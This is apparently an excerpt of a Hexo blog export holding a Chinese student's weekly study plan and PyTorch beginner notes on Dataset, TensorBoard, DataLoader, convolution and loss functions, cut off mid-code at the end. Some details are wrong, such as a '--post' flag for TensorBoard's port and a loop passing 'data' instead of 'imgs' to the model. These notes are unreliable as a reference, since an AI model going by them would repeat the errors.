<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>做一下每日必做的事情</li>
<li>看书</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>算法题（能刷几道刷几道）</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>工作</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>工作</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>7月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-7第二周学习计划</title>
    <url>/2023/07/15/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-7/2023-7-2nd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-7第二周学习计划"><a href="#2023-7第二周学习计划" class="headerlink" title="2023-7第二周学习计划"></a>2023-7第二周学习计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>周报下次要分为两个部分，要注重规划和总结这周干了什么</p>
<ol>
<li></li>
</ol>
</li>
</ol>
<h2 id="本周规划"><a href="#本周规划" class="headerlink" title="本周规划"></a>本周规划</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>主要是开始进行有节奏的学习</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li><p>把<code>pytorch</code>学习完成</p>
</li>
<li><p>把19篇论文看完</p>
<ol>
<li>要思考一下如何提高速度</li>
<li>要掌握一下看论文的方法</li>
<li></li>
</ol>
</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>操作系统要想一下如何学习</li>
<li>操作系统这个月要学习掉</li>
<li>估计一下这个的学习周期</li>
<li>要把刷算法题也要开始正常学习</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要思考如何把英语纳入日常的学习生活中</li>
<li>就是要规划一下雅思的复习</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>java已经很久没开始学习</li>
<li></li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>pr还差一点学完</li>
<li>要养成看书的习惯</li>
<li>考虑一下考驾照</li>
<li>开始慢慢戒掉短视频</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（9-00-12-00）"><a href="#上午（9-00-12-00）" class="headerlink" title="上午（9:00-12:00）"></a>上午（9:00-12:00）</h3><ol>
<li>做一下每日必做的事情</li>
<li>看书</li>
</ol>
<h3 id="中午（12-30-14-00）"><a href="#中午（12-30-14-00）" class="headerlink" title="中午（12:30-14:00）"></a>中午（12:30-14:00）</h3><ol>
<li>算法题（能刷几道刷几道）</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>工作</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><p>1.<br>2. </p>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>看电影</li>
<li>冥想</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>7月</tag>
      </tags>
  </entry>
  <entry>
    <title>Pytorch的学习笔记</title>
    <url>/2023/07/14/%E7%A7%91%E7%A0%94/Pytorch%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Pytorch的学习笔记"><a href="#Pytorch的学习笔记" class="headerlink" title="Pytorch的学习笔记"></a>Pytorch的学习笔记</h1><h2 id="Pytorch的安装"><a href="#Pytorch的安装" class="headerlink" title="Pytorch的安装"></a>Pytorch的安装</h2><h3 id="下载anconda"><a href="#下载anconda" class="headerlink" title="下载anconda"></a>下载anconda</h3><h3 id="在anconda建立一个环境"><a href="#在anconda建立一个环境" class="headerlink" title="在anconda建立一个环境"></a>在anconda建立一个环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create -n pytorch python=3.9</span><br></pre></td></tr></table></figure>

<h3 id="进入pytorch环境中"><a href="#进入pytorch环境中" class="headerlink" title="进入pytorch环境中"></a>进入pytorch环境中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pytorch</span><br></pre></td></tr></table></figure>

<h3 id="登入官网"><a href="#登入官网" class="headerlink" title="登入官网"></a>登入官网</h3><p> <a href="https://pytorch.org/">Pytorch官网</a></p>
<p>下拉选择选项，并复制代码，在conda命令框中下载。</p>
<p><img src="https://s2.loli.net/2023/07/07/eDrtNZT1uzonVdb.png" alt="选项页面"></p>
<h3 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h3><p>先要进入python环境，在命令行中输入<code>Python</code> </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line">torch.cuda.is_available()</span><br></pre></td></tr></table></figure>

<p>如果显示<code>True</code>或者<code>False</code>即为成功</p>
<h3 id="Pycharm安装和JupterNotebook安装"><a href="#Pycharm安装和JupterNotebook安装" class="headerlink" title="Pycharm安装和JupterNotebook安装"></a>Pycharm安装和JupterNotebook安装</h3><h2 id="Pytorch基础使用"><a href="#Pytorch基础使用" class="headerlink" title="Pytorch基础使用"></a>Pytorch基础使用</h2><h3 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h3><h6 id="用于打开内容"><a href="#用于打开内容" class="headerlink" title="用于打开内容"></a>用于打开内容</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir()</span><br></pre></td></tr></table></figure>



<h6 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help()</span><br><span class="line"># 注意如果是函数要去除函数的括号</span><br></pre></td></tr></table></figure>

<h2 id="Dataset数据加载"><a href="#Dataset数据加载" class="headerlink" title="Dataset数据加载"></a>Dataset数据加载</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset <span class="comment"># 用于加载数据</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># 用于加载图片数据</span></span><br><span class="line"><span class="keyword">import</span> os <span class="comment"># 可以操作系统文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义myData继承Dataset类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myData</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="comment"># 构造函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root_dir, label_dir</span>):</span><br><span class="line">        self.root_dir = root_dir</span><br><span class="line">        self.label_dir = label_dir</span><br><span class="line">        self.path = os.path.join(self.root_dir, self.label_dir) <span class="comment"># 用于将两个地址拼接起来</span></span><br><span class="line">        self.img_path = os.listdir(self.path) <span class="comment"># 将当前路径的中的所有文件名返回为一个列表</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 重载索引获取列表对象的函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, idx</span>):</span><br><span class="line">        img_name = self.img_path[idx]</span><br><span class="line">        img_item_path = os.path.join(self.path, img_name)</span><br><span class="line">        img = Image.<span class="built_in">open</span>(img_item_path)</span><br><span class="line">        label = self.label_dir</span><br><span class="line">        <span class="keyword">return</span> img, label</span><br><span class="line">    </span><br><span class="line">	<span class="comment"># 重载获取数据长度的函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.img_path)</span><br><span class="line"></span><br><span class="line">root_dir = <span class="string">&quot;练手数据集/train&quot;</span></span><br><span class="line">ants_dir = <span class="string">&quot;ants_image&quot;</span></span><br><span class="line">ants_dataset = myData(root_dir, ants_dir)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(ants_dataset))</span><br><span class="line">img, label = ants_dataset[<span class="number">1</span>]</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<p>如果是绝对路径要在字符串前面加上<code>r</code>，避免出现转义</p>
<p><code>self</code>相当于类的全局变量，便于类中其他的函数访问到另一个函数的中的变量，类似于C++和java中的<code>this</code></p>
<h2 id="tensorboard的使用"><a href="#tensorboard的使用" class="headerlink" title="tensorboard的使用"></a>tensorboard的使用</h2><h3 id="创建logs文件"><a href="#创建logs文件" class="headerlink" title="创建logs文件"></a>创建logs文件</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建名为logs的文件读写器</span></span><br><span class="line">writer =  SummaryWriter(<span class="string">&quot;logs&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;y=x&quot;</span>, i, i)</span><br><span class="line"></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>



<h3 id="打开logs文件"><a href="#打开logs文件" class="headerlink" title="打开logs文件"></a>打开logs文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tensorboard --logdir=logs</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>可以通过添加选项<code>--post=6001</code>指定启动端口</p>
<p>要在终端运行</p>
<h3 id="OpenCV的使用"><a href="#OpenCV的使用" class="headerlink" title="OpenCV的使用"></a>OpenCV的使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Transforms的使用"><a href="#Transforms的使用" class="headerlink" title="Transforms的使用"></a>Transforms的使用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>是一个工具箱，主要用于提供进行图像的处理的工具，主要有<code>ToTensor</code>，<code>resize</code>。</p>
<h3 id="ToTensor"><a href="#ToTensor" class="headerlink" title="ToTensor"></a>ToTensor</h3><p>将图片转换为<code>Tensor</code>的数据类型</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line">img_path = <span class="string">&quot;练手数据集/train/ants_image/0013035.jpg&quot;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(img_path)</span><br><span class="line"><span class="built_in">print</span>(img)</span><br><span class="line"></span><br><span class="line">tensor_trans = transforms.ToTensor()</span><br><span class="line">tensor_img = tensor_trans(img)</span><br></pre></td></tr></table></figure>

<h2 id="torchvision的简单使用"><a href="#torchvision的简单使用" class="headerlink" title="torchvision的简单使用"></a>torchvision的简单使用</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">train_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">True</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                         transform=dataset_transform)</span><br><span class="line"></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"><span class="comment"># print(test_set[0])</span></span><br><span class="line"><span class="comment"># print(test_set.classes)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># img, target = test_set[0]</span></span><br><span class="line"><span class="comment"># print(img)</span></span><br><span class="line"><span class="comment"># print(target)</span></span><br><span class="line"><span class="comment"># print(test_set.classes[target])</span></span><br><span class="line"><span class="comment"># img.show()</span></span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(<span class="string">&#x27;logs&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    img, target = test_set[i]</span><br><span class="line">    writer.add_image(<span class="string">&quot;CIFAR10&quot;</span>, img, i)</span><br><span class="line">writer.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="DataLoader的使用"><a href="#DataLoader的使用" class="headerlink" title="DataLoader的使用"></a>DataLoader的使用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import torchvision</span><br><span class="line">from torch.utils.data import DataLoader</span><br><span class="line">from torch.utils.tensorboard import SummaryWriter</span><br><span class="line"></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=&#x27;./dataset&#x27;, train=False, download=True,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"></span><br><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=4, shuffle=True, num_workers=0, drop_last=False)</span><br><span class="line"></span><br><span class="line"># print(test_set[0])</span><br><span class="line"></span><br><span class="line">writer = SummaryWriter(&#x27;logs&#x27;)</span><br><span class="line">step = 0</span><br><span class="line">for data in test_loader:</span><br><span class="line">    imgs, targets = data</span><br><span class="line">    writer.add_images(&quot;data_loader&quot;, imgs, step)</span><br><span class="line">    step += 1</span><br><span class="line">writer.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="神经网络框架"><a href="#神经网络框架" class="headerlink" title="神经网络框架"></a>神经网络框架</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Module</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        output = <span class="built_in">input</span> + <span class="number">1.0</span></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">module = Module()</span><br><span class="line">x = torch.tensor(<span class="number">1.0</span>)</span><br><span class="line">output = module(x)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="卷积神经网络-1D"><a href="#卷积神经网络-1D" class="headerlink" title="卷积神经网络(1D)"></a>卷积神经网络(1D)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入层</span></span><br><span class="line"><span class="built_in">input</span> = torch.tensor([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">                      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">                      [<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">                      [<span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">                      [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]])</span><br><span class="line"><span class="comment"># 卷积核</span></span><br><span class="line">kernel = torch.tensor([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>],</span><br><span class="line">                       [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">                       [<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line"><span class="comment"># 转换数据类型</span></span><br><span class="line"><span class="built_in">input</span> = torch.reshape(<span class="built_in">input</span>, (<span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>))</span><br><span class="line">kernel = torch.reshape(kernel, (<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>.shape)</span><br><span class="line"><span class="built_in">print</span>(kernel.shape)</span><br><span class="line"></span><br><span class="line">output = F.conv2d(<span class="built_in">input</span>, kernel, stride=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="卷积神经网络-2D"><a href="#卷积神经网络-2D" class="headerlink" title="卷积神经网络(2D)"></a>卷积神经网络(2D)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> Conv2d</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义数据集的转换操作</span></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载测试数据集</span></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试数据加载器</span></span><br><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=<span class="number">64</span>, shuffle=<span class="literal">True</span>, num_workers=<span class="number">0</span>, drop_last=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Module</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Module, self).__init__()</span><br><span class="line">        self.conv1 = Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">6</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">module = Module()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建用于写入TensorBoard日志的SummaryWriter对象</span></span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;logs&quot;</span>)</span><br><span class="line"></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"><span class="comment"># 对测试数据进行迭代</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> test_loader:</span><br><span class="line">    imgs, targets = data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前向传播计算输出</span></span><br><span class="line">    output = module(imgs)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(imgs.shape)</span><br><span class="line">    <span class="built_in">print</span>(output.shape)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将输入图像写入TensorBoard</span></span><br><span class="line">    writer.add_images(<span class="string">&quot;input&quot;</span>, imgs, step)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重塑输出张量的形状</span></span><br><span class="line">    output = torch.reshape(output, (-<span class="number">1</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将输出图像写入TensorBoard</span></span><br><span class="line">    writer.add_images(<span class="string">&quot;output&quot;</span>, output, step)</span><br><span class="line"></span><br><span class="line">    step += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="线性模型"><a href="#线性模型" class="headerlink" title="线性模型"></a>线性模型</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> MaxPool2d, ReLU, Sigmoid, Linear</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义数据集的转换操作</span></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载测试数据集</span></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试数据加载器</span></span><br><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=<span class="number">64</span>, shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Module</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Module, self).__init__()</span><br><span class="line">        self.linear = Linear(<span class="number">196608</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.linear(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">module = Module()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对测试数据进行迭代</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> test_loader:</span><br><span class="line">    imgs, targets = data</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(imgs.shape)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 展平输入张量</span></span><br><span class="line">    output = torch.flatten(imgs)</span><br><span class="line">    <span class="built_in">print</span>(output.shape)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 运行模型的前向传播</span></span><br><span class="line">    output = module(output)</span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> MSELoss, L1Loss</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建输入和目标张量</span></span><br><span class="line">inputs = torch.tensor([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], dtype=torch.float32)</span><br><span class="line">targets = torch.tensor([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], dtype=torch.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新调整张量的形状</span></span><br><span class="line">inputs = torch.reshape(inputs, (<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line">targets = torch.reshape(targets, (<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建L1损失函数对象</span></span><br><span class="line">loss = L1Loss(reduction=<span class="string">&#x27;sum&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算L1损失</span></span><br><span class="line">result = loss(inputs, targets)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建MSE损失函数对象</span></span><br><span class="line">loss_mse = MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算MSE损失</span></span><br><span class="line">result_mse = loss_mse(inputs, targets)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(result_mse)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="神经网络的损失函数"><a href="#神经网络的损失函数" class="headerlink" title="神经网络的损失函数"></a>神经网络的损失函数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> Linear, Conv2d, MaxPool2d, Flatten, Sequential, CrossEntropyLoss</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义数据集的转换操作</span></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载测试数据集</span></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试数据加载器</span></span><br><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=<span class="number">64</span>, shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Module</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Module, self).__init__()</span><br><span class="line">        self.model1 = Sequential(</span><br><span class="line">            Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Conv2d(<span class="number">32</span>, <span class="number">32</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Flatten(),</span><br><span class="line">            Linear(<span class="number">1024</span>, <span class="number">64</span>),</span><br><span class="line">            Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> self.model1(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建交叉熵损失函数对象</span></span><br><span class="line">loss = CrossEntropyLoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建模型对象</span></span><br><span class="line">module = Module()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对测试数据进行迭代</span></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> test_loader:</span><br><span class="line">    imgs, targets = data</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前向传播计算输出</span></span><br><span class="line">    output = module(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 